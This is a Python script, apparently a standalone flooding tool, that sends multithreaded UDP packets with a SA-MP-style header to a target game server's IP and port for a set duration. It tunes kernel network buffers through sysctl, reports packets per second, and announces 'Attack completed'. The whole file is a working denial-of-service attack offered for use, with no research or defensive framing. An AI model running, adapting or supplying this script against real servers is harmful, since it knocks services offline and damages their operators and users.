#!/usr/bin/env python3
import socket, struct, sys, os, random, threading, time, signal, gc

MAX_THREADS = 8
PACKET_SIZE = 1400
DURATION_SECONDS = 60

os.system('sysctl -w net.core.rmem_max=134217728 >/dev/null 2>&1')
os.system('sysctl -w net.core.wmem_max=134217728 >/dev/null 2>&1')
os.system('sysctl -w net.core.netdev_max_backlog=500000 >/dev/null 2>&1')
try:
    resource.setrlimit(resource.RLIMIT_NOFILE, (1048576, 1048576))
except: pass

gc.disable()

class SAMPAbsoluteMax:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.total_threads = MAX_THREADS
        self.payload_size = PACKET_SIZE
        self.duration = DURATION_SECONDS
        self.running = True
        self.total_packets = 0
        self.stats_lock = threading.Lock()
        self.start_time = 0
        
        payload_template = b'\x08\x1e' + os.urandom(2) + b'\xda'
        self.payload = (payload_template + b'\xff' * (self.payload_size - len(payload_template)))[:self.payload_size]
        
        print(f"--- SAMP FLOOD OPTIMIZED ---")
        print(f"TARGET: {target_ip}:{target_port}")
        print(f"THREADS: {self.total_threads}")
        print(f"PAYLOAD: {self.payload_size} bytes")
        print(f"DURATION: {self.duration}s")
        print("---------------------------")

    def _worker_thread(self, thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        try: sock.bind(('0.0.0.0', random.randint(1024, 65535)))
        except: pass
        
        local_packets = 0
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < self.duration:
            try:
                sock.sendto(self.payload, (self.target_ip, self.target_port))
                local_packets += 1
            except:
                try: sock.close()
                except: pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        
        with self.stats_lock:
            self.total_packets += local_packets
        sock.close()

    def _stats_reporter(self):
        while self.running:
            time.sleep(2)
            if self.running:
                elapsed = time.time() - self.start_time
                with self.stats_lock:
                    pps = self.total_packets / elapsed if elapsed > 0 else 0
                    mbps = (self.total_packets * self.payload_size) / elapsed / 1024 / 1024 if elapsed > 0 else 0
                    print(f"\r[+] PPS: {pps:,.0f} | {mbps:.2f} MB/s | TOTAL: {self.total_packets:,} | ELAPSED: {elapsed/60:.1f}m", end='')

    def start(self):
        self.start_time = time.time()
        threads = []
        for i in range(self.total_threads):
            t = threading.Thread(target=self._worker_thread, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        reporter = threading.Thread(target=self._stats_reporter)
        reporter.daemon = True
        reporter.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        finally:
            self.running = False
            time.sleep(2)
            elapsed = time.time() - self.start_time
            print(f"\n[+] Attack completed: {elapsed/60:.1f} minutes")
            print(f"[+] Total packets sent: {self.total_packets:,}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("USAGE: python script.py IP PORT")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    flooder = SAMPAbsoluteMax(sys.argv[1], sys.argv[2])
    flooder.start()
    gc.enable()
